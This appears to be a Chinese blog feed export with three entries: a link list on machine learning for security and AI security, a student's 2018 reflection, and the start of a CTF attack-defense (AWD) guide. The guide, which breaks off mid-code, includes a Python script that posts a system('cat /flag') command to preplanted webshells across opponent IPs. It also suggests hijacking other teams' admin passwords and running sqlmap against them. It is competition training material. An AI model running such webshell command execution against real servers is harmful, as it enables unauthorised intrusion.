href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A3%80%E6%B5%8BXSS%28%E7%BB%AD%29/" target="_blank" rel="external">使用深度学习检测XSS(续)</a></li></ul><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><ul><li><a href="https://manning23.github.io/2018/10/12/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%A7%84%E5%88%99%E5%AE%9E%E7%8E%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用机器学习和规则实现弱口令检测</a></li></ul><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><ul><li><a href="https://github.com/aviraonepiece/machine_learning" target="_blank" rel="external">基于KDDCUP 99数据集预测DDoS攻击</a></li><li><a href="http://wap.cnki.net/lunwen-1013353778.html" target="_blank" rel="external">基于谱分析与统计机器学习的DDoS攻击检测技术研究</a></li><li><a href="http://cdmd.cnki.com.cn/Article/CDMD-90002-2007140546.htm" target="_blank" rel="external">基于机器学习的分布式拒绝服务攻击检测方法研究</a></li><li><a href="https://pdfs.semanticscholar.org/6363/b9f28a7e037abe626a2e88fac3393c04bfda.pdfDefending" target="_blank" rel="external">DDoS Attacks Using Hidden Markov Models and Cooperative ReinforcementLearning*</a></li></ul><h3 id="恶意url检测"><a href="#恶意url检测" class="headerlink" title="恶意url检测"></a>恶意url检测</h3><ul><li><a href="https://arxiv.org/abs/1802.03162v2" target="_blank" rel="external">URLNet：通过深度学习学习URL表示以进行恶意URL检测</a></li><li><a href="http://www.freebuf.com/articles/network/131279.html" target="_blank" rel="external">用机器学习玩转恶意URL 检测</a></li><li><a href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs" target="_blank" rel="external">使用机器学习来检测恶意URL</a></li></ul><h3 id="DGA"><a href="#DGA" class="headerlink" title="DGA"></a>DGA</h3><ul><li><a href="http://galaxylab.org/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-dga%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">机器学习实践-DGA检测</a></li><li><a href="https://iami.xyz/DGA-Detect/" target="_blank" rel="external">使用fasttext进行DGA检测</a></li><li><a href="http://galaxylab.org/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-dga%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">机器学习实践-DGA检测</a></li><li><a href="http://www.iot-online.com/art/2017/071474067.html" target="_blank" rel="external">使用深度学习检测DGA</a></li><li><a href="https://www.freebuf.com/articles/es/187451.html" target="_blank" rel="external">机器学习与威胁情报的融合：一种基于AI检测恶意域名的方法</a></li><li><a href="https://github.com/surajr/URL-Classification" target="_blank" rel="external">https://github.com/surajr/URL-Classification</a></li></ul><h3 id="恶意流量检测"><a href="#恶意流量检测" class="headerlink" title="恶意流量检测"></a>恶意流量检测</h3><ul><li><a href="https://www.freebuf.com/column/170483.html" target="_blank" rel="external">利用机器学习检测HTTP恶意外连流量</a></li></ul><h3 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h3><ul><li><a href="https://xz.aliyun.com/t/3485" target="_blank" rel="external">使用机器学习检测混淆的命令行</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-8151.html" target="_blank" rel="external">利用机器学习进行恶意代码分类</a></li><li><a href="http://drops.xmd5.com/static/drops/mobile-13428.html" target="_blank" rel="external">用机器学习检测Android恶意代码</a></li><li><a href="https://iami.xyz/AliSEC3/" target="_blank" rel="external">恶意软件与数据分析</a></li><li><a href="https://devblogs.nvidia.com/malware-detection-neural-networks/" target="_blank" rel="external">Malware Detection in Executables Using Neural Networks</a></li><li><a href="https://www.freebuf.com/articles/system/182566.html" target="_blank" rel="external">基于深度学习的恶意样本行为检测(含源码)</a></li><li><a href="https://xz.aliyun.com/t/2447" target="_blank" rel="external">深度学习在恶意软件检测中的应用</a></li><li><a href="https://xz.aliyun.com/t/2437" target="_blank" rel="external">用机器学习检测恶意PowerShell</a></li><li><a href="https://xz.aliyun.com/t/3704" target="_blank" rel="external">用机器学习进行恶意软件检测——以阿里云恶意软件检测比赛为例</a></li><li><a href="http://4o4notfound.org/index.php/archives/179/" target="_blank" rel="external">第二届微软恶意软件预测挑战赛初探</a></li></ul><h3 id="钓鱼检测"><a href="#钓鱼检测" class="headerlink" title="钓鱼检测"></a>钓鱼检测</h3><ul><li><a href="http://www.freebuf.com/sectool/142955.html" target="_blank" rel="external">IsThisLegit+Phinn：采用了机器学习算法的开源网络钓鱼防御与检测工具</a></li><li>王田峰.基于机器学习算法的钓鱼网站检测系统[D].东南大学， 2011.</li></ul><h3 id="APT检测"><a href="#APT检测" class="headerlink" title="APT检测"></a>APT检测</h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzU5MTM5MTQ2MA==&amp;mid=2247484139&amp;idx=1&amp;sn=0da63a49f341eccc0bb48c954d8ebbb4&amp;chksm=fe2efd60c95974767521fe6a6b7257a1d05e5482fc7ddeda281bdf0f0deb20add82d1a82d8ec&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;pass_ticket=bjnNiDKomd79pQvRonW%2BXsTe6JrO%2FFs6oII12dZaLBPuQOtNK6Rzh9WSJ%2B%2F89ZUA#rd" target="_blank" rel="external">APT detection based on machine learning</a></li></ul><h3 id="业务安全检测"><a href="#业务安全检测" class="headerlink" title="业务安全检测"></a>业务安全检测</h3><ul><li><a href="https://xz.aliyun.com/t/2801" target="_blank" rel="external">基于设备指纹的风控建模以及机器学习的尝试</a></li><li><a href="https://xz.aliyun.com/t/2951" target="_blank" rel="external">如何在安全风控中评估和量化机器学习有效性</a></li><li><a href="https://www.anquanke.com/post/id/85741" target="_blank" rel="external">人工智能反欺诈三部曲——特征工程</a></li><li><a href="https://zhuanlan.zhihu.com/p/24690287" target="_blank" rel="external">阿里巴巴直播内容风险防控中的AI力量</a></li><li><a href="https://zhuanlan.zhihu.com/p/31712434" target="_blank" rel="external">人工智能反欺诈三部曲之：设备指纹</a></li></ul><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><a href="https://www.anquanke.com/post/id/157175" target="_blank" rel="external">机器学习在WindowsRDP版本和后门检测上的应用</a></li><li><a href="https://github.com/BoneLee/dns_tunnel_dectect_with_CNN" target="_blank" rel="external">使用CNN检测DNS隧道</a></li><li><a href="https://www.anquanke.com/post/id/163637" target="_blank" rel="external">解决机器学习和安全运营之间的最后一公里问题</a></li></ul><h2 id="AI本身安全"><a href="#AI本身安全" class="headerlink" title="AI本身安全"></a>AI本身安全</h2><h3 id="AI模型安全"><a href="#AI模型安全" class="headerlink" title="AI模型安全"></a>AI模型安全</h3><p>逃逸攻击：</p><ul><li><a href="https://www.anquanke.com/post/id/87037" target="_blank" rel="external">对深度学习的逃逸攻击 - 探究人工智能系统中的安全盲区</a></li><li><a href="http://bindog.github.io/blog/2016/11/13/game-playing-with-ml-in-security/" target="_blank" rel="external">安全领域中机器学习的对抗和博弈</a></li><li><a href="https://www.cdxy.me/?p=798" target="_blank" rel="external">基础攻防场景下的AI对抗样本初探</a></li><li><a href="https://zhuanlan.zhihu.com/p/34038758" target="_blank" rel="external">手写数字识别的攻击</a></li><li><a href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E7%94%9F%E6%88%90%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%28GAN%29%E7%94%9F%E6%88%90DGA/" target="_blank" rel="external">使用生成对抗网络(GAN)生成DGA</a></li><li><a href="https://mp.weixin.qq.com/s/kP4YuiksI1dfZdT8Z_j_cQ" target="_blank" rel="external">从安全视角对机器学习的部分思考</a></li></ul><h3 id="AI框架安全"><a href="#AI框架安全" class="headerlink" title="AI框架安全"></a>AI框架安全</h3><ul><li><a href="https://www.anquanke.com/post/id/86989" target="_blank" rel="external">深度学习框架中的魔鬼 - 探究人工智能系统中的安全问题</a></li><li><a href="https://mp.weixin.qq.com/s/QKXd9AKkVwk3CO45-BbZSA?" target="_blank" rel="external">机器学习对抗性攻击报告</a></li></ul><h3 id="AI数据安全"><a href="#AI数据安全" class="headerlink" title="AI数据安全"></a>AI数据安全</h3><p>机器学习面临的数据污染问题。通过原理说明和代码实例，展示数据污染的特点和攻击效果。</p><ul><li><a href="https://www.anquanke.com/post/id/150653" target="_blank" rel="external">如何利用AI对抗“数据污染”和”数据中毒“？</a></li><li><a href="https://www.leiphone.com/news/201806/rYrfwtaeCNohEf0D.html" target="_blank" rel="external">对抗数据中毒–机器学习在阿里巴巴网络安全的应用</a></li><li><a href="https://manning23.github.io/2017/08/08/%E4%B8%89%E7%A7%8D%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F%E5%AF%B9%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E7%9A%84%E5%BD%B1%E5%93%8D/" target="_blank" rel="external">三种特征向量对深度学习攻击检测的影响</a></li><li><a href="https://www.anquanke.com/post/id/144837" target="_blank" rel="external">DEFCON CHINA议题解读| 对深度学习系统的数据流攻击</a></li><li><a href="https://www.anquanke.com/post/id/95095" target="_blank" rel="external">对深度学习的降维攻击 - 人工智能系统数据流中的安全风险</a></li></ul><h3 id="AI代码安全"><a href="#AI代码安全" class="headerlink" title="AI代码安全"></a>AI代码安全</h3><p>模型代码的漏洞挖掘和利用</p><ul><li><a href="https://cloud.tencent.com/developer/article/1144154" target="_blank" rel="external">机器学习对抗性攻击</a></li></ul><h2 id="AI保护AI"><a href="#AI保护AI" class="headerlink" title="AI保护AI"></a>AI保护AI</h2><h3 id="攻击算法"><a href="#攻击算法" class="headerlink" title="攻击算法"></a>攻击算法</h3><p><a href="https://blog.csdn.net/qq_35414569/article/details/80966564" target="_blank" rel="external">DeepFool对抗算法</a></p><p>FGSM算法：机器学习对抗算法中的FGSM算法。通过算法说明和代码实例，展示FGSM算法的特点和攻击效果。</p><h3 id="对抗样本"><a href="#对抗样本" class="headerlink" title="对抗样本"></a>对抗样本</h3><ul><li><a href="https://mp.weixin.qq.com/s/F2gBP23LCEF72QDlugbBZQ" target="_blank" rel="external">详解如何使用Keras实现Wassertein GAN</a></li></ul><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><ul><li><a href="https://segmentfault.com/a/1190000016981979" target="_blank" rel="external">网络安全与机器学习（一）：网络安全中的机器学习算法</a></li><li><a href="https://segmentfault.com/a/1190000016982928" target="_blank" rel="external">网络安全与机器学习（二）：网络安全任务如何结合机器学习？</a></li><li><a href="https://cloud.tencent.com/developer/article/1045024" target="_blank" rel="external">机器学习在安全攻防场景的应用与分析</a></li><li><a href="https://manning23.github.io/2016/04/06/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/" target="_blank" rel="external">逻辑回归算法分析与安全场景分析</a></li><li><a href="https://www.anquanke.com/post/id/163637" target="_blank" rel="external">解决机器学习和安全运营之间的最后一公里问题</a></li><li><a href="http://ai.51cto.com/art/201811/587025.htm" target="_blank" rel="external">一文全面解读网络安全中的机器学习</a></li></ul><h2 id="优秀Github推荐"><a href="#优秀Github推荐" class="headerlink" title="优秀Github推荐"></a>优秀Github推荐</h2><p><a href="https://github.com/jivoi/awesome-ml-for-cybersecurity/blob/master/README_ch.md" target="_blank" rel="external">网络安全中机器学习大合集</a></p><p><a href="http://www.covert.io/the-definitive-security-datascience-and-machinelearning-guide/" target="_blank" rel="external">最终安全数据科学和机器学习指南</a></p><p><a href="https://github.com/wtsxDev/Machine-Learning-for-Cyber-Security#-datasets" target="_blank" rel="external">Machine Learning for Cyber Security</a></p><p><a href="https://github.com/404notf0und/AI-for-Security-Learning" target="_blank" rel="external">404师傅的整理</a></p><p><a href="https://github.com/RandomAdversary/Awesome-AI-Security" target="_blank" rel="external">Awesome-AI-Security</a></p><p><a href="https://github.com/mylamour/machine-learning-for-security" target="_blank" rel="external">iami师傅的整理</a></p><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security" target="_blank" rel="external">关于机器学习和安全的源代码</a></p><p><a href="https://github.com/hongriSec/AI-Machine-Learning-Security" target="_blank" rel="external">红日安全</a></p><h2 id="优秀博客"><a href="#优秀博客" class="headerlink" title="优秀博客"></a>优秀博客</h2><p><a href="http://webber.tech/" target="_blank" rel="external">http://webber.tech/</a></p><p><a href="http://bindog.github.io/" target="_blank" rel="external">http://bindog.github.io</a></p><p><a href="https://www.cdxy.me/" target="_blank" rel="external">https://www.cdxy.me</a></p><p><a href="https://iami.xyz/" target="_blank" rel="external">https://iami.xyz</a></p><p><a href="https://www.zuozuovera.com/" target="_blank" rel="external">https://www.zuozuovera.com/</a></p><p><a href="https://home.cnblogs.com/u/LittleHann/" target="_blank" rel="external">LittleHann师傅</a></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE4MTQ2OA==&amp;mid=2652730162&amp;idx=1&amp;sn=8c21d7b37036fa01ad668fe0a00e4b58&amp;chksm=805c1981b72b90977b7c60f5800f2ba8e5d2f541a12aa1a8e183b5d0c1d82e923f67bee4e557&amp;scene=21#wechat_redirect" target="_blank" rel="external">入行 AI，如何选个脚踏实地的岗位</a></p><p><a href="https://segmentfault.com/a/1190000008906097" target="_blank" rel="external">为什么机器学习在安全、风控领域频频遇冷?</a></p><h1 id="学习机器学习"><a href="#学习机器学习" class="headerlink" title="学习机器学习"></a>学习机器学习</h1><h2 id="第一步：学习编程"><a href="#第一步：学习编程" class="headerlink" title="第一步：学习编程"></a>第一步：学习编程</h2><p>实话说，计算机体系很大，除了语言、数据机构、算法之外，计算机体系结构、操作系统、网络、数据库等等领域庞大。但不管怎样，学习如何编写代码、如何编程是必备的。如何学习编程呢？学完数据结构、算法等知识后，如何提高编程能力呢？上LeetCode刷题成为很多人的不二之选。<br>推荐教程：python廖雪峰</p><h2 id="第二步：扎实数学"><a href="#第二步：扎实数学" class="headerlink" title="第二步：扎实数学"></a>第二步：扎实数学</h2><p>数学是搞数据科学的必备基础，数学不扎实，机器学习里很多原理、推导、公式便无法理解透彻，比如单单一个SVM就涉及到求导、凸优化等数学知识。所以如果数学忘了，很有必要复习并重新扎实数学基础。<br>涵盖内容：微积分、数理统计与概率论、矩阵、凸优化<br>推荐书籍：数理统计学简史、矩阵分析与应用by张贤达、凸优化(Convex Optimization)<br>推荐课程：<a href="https://mp.weixin.qq.com/s?__biz=Mzg5NzAxMDgwNg==&amp;mid=2247483685&amp;idx=1&amp;sn=1cc418d56344a222a0b6c9a56bdc5026&amp;chksm=c0791c3cf70e952ada01da3a790baa6325c2656a554566716ad96b83c7d1868770514aca8409&amp;scene=21#wechat_redirect" target="_blank" rel="external">机器学习中的数学</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5NzAxMDgwNg==&amp;mid=2247483911&amp;idx=1&amp;sn=0aa891449692d85382a9b2b5016728bb&amp;chksm=c0791f1ef70e960822c7b67b4216f6c7dc55b2c0f3f75ec7527523daea9ad25b3f86b94d5bec&amp;scene=21#wechat_redirect" target="_blank" rel="external">李航《统计学习方法》</a></p><h2 id="第三步：掌握适合数据科学的Python"><a href="#第三步：掌握适合数据科学的Python" class="headerlink" title="第三步：掌握适合数据科学的Python"></a>第三步：掌握适合数据科学的Python</h2><p>python在当今的数据分析很热，广泛应用于金融、电商等领域的大数据分析，也非常适合数据工作者利用它处理数据，所以Python在数据领域应用越来越广泛。<br>推荐教程：《利用python进行数据分析》、《Python爬虫》</p><p><a href="https://bookdata.readthedocs.io/en/latest/index.html" target="_blank" rel="external">Python 和数据科学</a></p><h2 id="第四步：开始学习机器学习"><a href="#第四步：开始学习机器学习" class="headerlink" title="第四步：开始学习机器学习"></a>第四步：开始学习机器学习</h2><p>机器学习技术在很多领域应用广泛，包括在数据挖掘、搜索、推荐、广告、自然语言处理等等中。所以学好机器学习，是搞更多应用领域的前提条件。此外，学习机器学习，不单单只是学习一个个模型、算法就足够，因为实际的机器学习工作中，分析问题、处理数据、处理特征占绝大部分工作。所以不要以为看到一个课程涵盖许许多多的模型/算法就以为捡到了宝，看一个ML课程有没有工业实战，最快判断的标准之一是看它讲不讲以及是否能讲好特征工程、模型调优。<br>推荐书籍：PRML<br>推荐课程：吴恩达《机器学习》公开课</p><p>原课程地址：coursera.org/course/ml</p><h2 id="第五步：再进一步之学习DL"><a href="#第五步：再进一步之学习DL" class="headerlink" title="第五步：再进一步之学习DL"></a>第五步：再进一步之学习DL</h2><p>得益于计算机越发强大的计算能力，神经网络的加强版深度学习（权且容许我这么不专业的叫法）越发火热，从AlphaGo、无人驾驶再到最近的AlphaGo 2.0横扫中日韩顶级骑手，AI可谓出尽了风头，在这个人工智能与大数据的时代，不学点AI，都不好意思出门跟人打招呼说我是搞计算机技术的了。<br>推荐课程：吴恩达《深度学习》公开课</p><p>原课程地址：www.deeplearning.ai</p><h2 id="第六步：做实验及上kaggle实战"><a href="#第六步：做实验及上kaggle实战" class="headerlink" title="第六步：做实验及上kaggle实战"></a>第六步：做实验及上kaggle实战</h2><p>纸上得来终觉浅、绝知此事要躬行。理论学习再多最终还是要实战。为降低门槛起见，你可以从做一个一个有趣的深度学习实验开始，比如学梵高作画、自动玩flappy bird等等。然后，在kaggle上多刷刷一些数据竞赛项目</p><h2 id="第七步：实习或工作"><a href="#第七步：实习或工作" class="headerlink" title="第七步：实习或工作"></a>第七步：实习或工作</h2><p>如果你是想做数据挖掘、计算机视觉、自然语言处理，可以继续学相关的课程。此外，很多经典最新论文值得一读。如果足够了，那就正式出山到实际江湖上闯一闯吧：找份工作，干一把！<br>推荐公司：有资源、有数据的偏大一点的公司  </p><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><ul><li><p><a href="https://github.com/ZuzooVn/machine-learning-for-software-engineers/blob/master/README-zh-CN.md" target="_blank" rel="external">软件工程师的机器学习</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?srcid=1225hekEwhcnq3PVwpGoV7wq&amp;scene=23&amp;mid=2247484000&amp;sn=92f198b840073e79e1a267d15a48a279&amp;idx=1&amp;__biz=Mzg5NzAxMDgwNg%3D%3D&amp;chksm=c0791f79f70e966fccd525bc2ecb11d328a12f566ccdc781132ffeeb41c484c1f7757db03911&amp;mpshare=1" target="_blank" rel="external">吴海广的建议</a></p></li><li><p>红色石头：</p><p>  <a href="https://www.itcodemonkey.com/article/6848.html" target="_blank" rel="external">https://www.itcodemonkey.com/article/6848.html</a></p><p>  <a href="https://36kr.com/p/5109465.html" target="_blank" rel="external">https://36kr.com/p/5109465.html</a></p><p>  <a href="https://zhuanlan.zhihu.com/p/29704017" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29704017</a></p></li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p> <a href="https://pan.baidu.com/s/1k64FTLw1Gv87WbYqviM45Q#list/path=%2F提取密码：bs8w" target="_blank" rel="external">https://pan.baidu.com/s/1k64FTLw1Gv87WbYqviM45Q#list/path=%2F提取密码：bs8w</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AI-Security-Learning&quot;&gt;&lt;a href=&quot;#AI-Security-Learning&quot; class=&quot;headerlink&quot; title=&quot;AI-Security-Learning&quot;&gt;&lt;/a&gt;AI-Security-Learning&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="AiSecurity" scheme="http://Bigbroke.com/categories/AiSecurity/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018反思总结</title>
    <link href="http://Bigbroke.com/archis/f7c9beed/"/>
    <id>http://Bigbroke.com/archis/f7c9beed/</id>
    <published>2018-12-30T17:14:45.000Z</published>
    <updated>2018-12-30T17:16:49.579Z</updated>
    
    <content type="html"><![CDATA[<p>时间过得真的很快，转眼的大二没了，大三也过了一半。</p><p>其实这一次总结真不知道该说什么</p><p>这一年有很多的成长和感动吧。</p><p>“Talk is Cheap. Show me the code.”这一年明白的最重要的道理了。</p><p>这一年还是一如既往的当个脚本小子，尝试了读源码去审计，一开始也头疼的要死，根本顶不住，陷入函数追踪的漩涡之中，摸搜了很久才找到自己的一点方法。</p><p>颓废也有，失望也有，努力追寻也有。</p><p>这一年算是踏入安全圈子的第二年。从大二开始懵懵懂懂学习web，学习ctf，学习基础渗透。到现在入门机器学习的大坑，内网渗透的一点大坑（实名感谢刘哥，有一个好圈子的重要吧，自己也学了不少东西）。</p><p>做安全真的是个很累的事情，不止于身体吧，还有每天拷问自己灵魂的一句，“我他妈怎么这么菜”。可是总有人要为某个行业做出点贡献，要修补随时可能出现问题的大船，保护一些梦想。</p><p>我想自己也应该要做一些值得做的，没有多少人帮助，也要硬着头皮自己上吧。也希望多接触更多人，扩大圈子学到更多别人身上的优点吧。</p><p>学任何东西最好有个奖励机制吧，能看到自己的成长，打了各个ctf比赛，发表了文章发现自己也能靠自己能力赚钱，收获水货cve、cnvd，挖了一点垃圾漏洞提交，拿到了自己想做的实习工作。就这样一直努力下去吧。</p><p>说到行业，自己暑假本要去某恒实习，无奈被鸽，暑假两个月在学校偶尔颓废，也算达成了自己要达成的目标吧。</p><p>现在也还不错，有两三个offer，寒假去实习ueba研究也请更加努力造出东西吧。希望未来自己能在安全数据分析有所造化吧。</p><p>学了一年半接触了很多，认识了很多小伙伴。感谢他们的陪伴。也感谢女朋友一直给的鼓励和支持。</p><p>接下来也请做自己喜欢的研究，不要为了某些利益而改变内心的欢喜，做自己喜欢的事才是人生一大快乐啊。</p><p>不畏将来，不忘初心吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;时间过得真的很快，转眼的大二没了，大三也过了一半。&lt;/p&gt;
&lt;p&gt;其实这一次总结真不知道该说什么&lt;/p&gt;
&lt;p&gt;这一年有很多的成长和感动吧。&lt;/p&gt;
&lt;p&gt;“Talk is Cheap. Show me the code.”这一年明白的最重要的道理了。&lt;/p&gt;
&lt;p&gt;这一年
      
    
    </summary>
    
      <category term="思考" scheme="http://Bigbroke.com/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="life" scheme="http://Bigbroke.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>初探线下CTF-AWD模式</title>
    <link href="http://Bigbroke.com/archis/49b464e6/"/>
    <id>http://Bigbroke.com/archis/49b464e6/</id>
    <published>2018-12-02T09:13:50.000Z</published>
    <updated>2018-12-02T09:15:54.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探线下CTF-AWD模式"><a href="#初探线下CTF-AWD模式" class="headerlink" title="初探线下CTF AWD模式"></a>初探线下CTF AWD模式</h1><p>祭上大牛的导图</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg" alt=""></p><p><img src="https://i.loli.net/2018/07/11/5b45bb55a8a62.png" alt="naotu.png"></p><h2 id="0x00防御"><a href="#0x00防御" class="headerlink" title="0x00防御"></a>0x00防御</h2><p>先做好防御工作，否则一开始被打穿后面心态就容易崩</p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><h5 id="ssh密码修改"><a href="#ssh密码修改" class="headerlink" title="ssh密码修改"></a>ssh密码修改</h5><pre><code class="bash">sudo passwd user</code></pre><h5 id="mysql密码修改"><a href="#mysql密码修改" class="headerlink" title="mysql密码修改"></a>mysql密码修改</h5><pre><code class="mysql">mysql&gt; SET PASSWORD FOR &#39;user&#39;@&#39;localhost&#39; = PASSWORD(&#39;newpass&#39;);</code></pre><h5 id="web后台密码修改"><a href="#web后台密码修改" class="headerlink" title="web后台密码修改"></a>web后台密码修改</h5><p>Web后台很有可能存在弱口令，一般都是admin/admin,admin/123456,test/test等等，同样需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的wordpress。</p><p>直接在后台管理页面进行修改</p><p>当然有些情况是比赛不允许修改后台口令，会将修改后台口令视为宕机，还要被扣分</p><h5 id="修改MongoDB密码（27017端口）"><a href="#修改MongoDB密码（27017端口）" class="headerlink" title="修改MongoDB密码（27017端口）"></a>修改MongoDB密码（27017端口）</h5><h5 id="修改Redis密码（6379端口）"><a href="#修改Redis密码（6379端口）" class="headerlink" title="修改Redis密码（6379端口）"></a>修改Redis密码（6379端口）</h5><h5 id="修改网站源码中的数据库连接配置"><a href="#修改网站源码中的数据库连接配置" class="headerlink" title="修改网站源码中的数据库连接配置"></a>修改网站源码中的数据库连接配置</h5><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><p>可以用Winscp、FileZilla之类的工具连接下载/var/www/html/下的文件做好备份 </p><pre><code># 打包目录tar -zcvf web.tar.gz /var/www/html 备份源码tar -zcf /tmp/name.tar.gz /path/web# 解包tar -zxvf archive_name.tar.gz</code></pre><h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><pre><code>备份[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysqldump -u 用户名 -p 数据库名&gt;导出的文件名mysqldump -u root -p 数据库名&gt;Test0809.sql，输入密码即可。# 备份指定的多个数据库mysqldump -u root -p --databases choose test &gt; /tmp/db.sql# 恢复备份，在mysql终端下执行：# 命令格式：source FILE_PATHsource ~/db.sql# 曾经遇到一个备份有问题可以执行下面mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql# 重置mysql密码# 方法1：用SET PASSWORD命令mysql&gt; set password for 用户名@localhost = password(&#39;新密码&#39;);# 方法2：用mysqladminmysqladmin -u用户名 -p旧密码 password 新密码</code></pre><h3 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h3><p>有些比赛主办方会在服务器预留后门，这时可以把备份目录用D盾之类的工具扫描一下，或者下载相同的cms来进行目录对比。有的话立刻删除，并且利用这个后门攻击其他服务器（很可能后门密码相同或者类似，可以猜解）</p><p>参考<a href="http://tinyfisher.github.io/security/2017/10/02/CTF" target="_blank" rel="external">表哥</a>的脚本，修改其中的地址、shell路径和密码即可</p><pre><code class="python">#coding=utf-8import requestsurl=&quot;http://192.168.71.&quot;url1=&quot;&quot;shell=&quot;/Upload/index.php&quot;passwd=&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot; port=&quot;80&quot;payload = {passwd: &#39;system(\&#39;cat /flag\&#39;);&#39;}f=open(&quot;webshelllist.txt&quot;,&quot;w&quot;) f1=open(&quot;firstround_flag.txt&quot;,&quot;w&quot;)for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]:     url1=url+str(i)+&quot;:&quot;+port+shell    try:        res=requests.post(url1,payload,timeout=1)        if res.status_code == requests.codes.ok:            print url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f1,url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f,url1+&quot;,&quot;+passwd        else:            print &quot;shell 404&quot;    except:        print url1+&quot; connect shell fail&quot;f.close()f1.close()</code></pre><h3 id="部署waf"><a href="#部署waf" class="headerlink" title="部署waf"></a>部署waf</h3><p>一般SQL注入之类的漏洞不会有过滤，可以部署waf来拖延对方时间。同理，可以在对方部署waf前利用sqlmap来跑</p><p>上传漏洞也是简单的黑名单过滤，但是可以通过部署waf来删除常规木马，拖延对方的时间</p><p>waf可以用安全狗linux版或者柠檬师傅发的:</p><pre><code class="php">&lt;?php$WAF_log = &#39;/var/tmp/web_log_&#39;;$Upload_dir = &#39;/var/tmp/upload/&#39;;error_reporting(0);function waf() {    global $Upload_dir;    if (!function_exists(&#39;getallheaders&#39;)) {        function getallheaders() {            foreach ($_SERVER as $name =&gt; $value) {                if (substr($name, 0, 5) == &#39;HTTP_&#39;) {                    $headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value;                }            }            unset($header[&#39;Accept&#39;]);            return $headers;        }    }    $get = $_GET;    $get2 = $_SERVER[&#39;QUERY_STRING&#39;];    $post = $_POST;    $post2 = @file_get_contents(&#39;php://input&#39;);    $cookie = $_COOKIE;    $header = getallheaders();    $header[&#39;url&#39;] = $_SERVER[&#39;REQUEST_METHOD&#39;] . &#39; &#39; . &#39;http://&#39; . $_SERVER[&#39;SERVER_NAME&#39;] . &#39;:&#39; . $_SERVER[&quot;SERVER_PORT&quot;] . $_SERVER[&quot;REQUEST_URI&quot;];    $files = $_FILES;    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];    $method = $_SERVER[&#39;REQUEST_METHOD&#39;];    $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;];    if (!empty($files)) {        foreach ($_FILES as $key =&gt; $value) {            $files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]);            move_uploaded_file($_FILES[$key][&#39;tmp_name&#39;], $Upload_dir . $_FILES[$key][&quot;name&quot;] . &#39;.&#39; . time());            file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;lemon&quot;);        }    }    unset($header[&#39;Accept&#39;]);    $input = array(&quot;Header&quot; =&gt; $header, 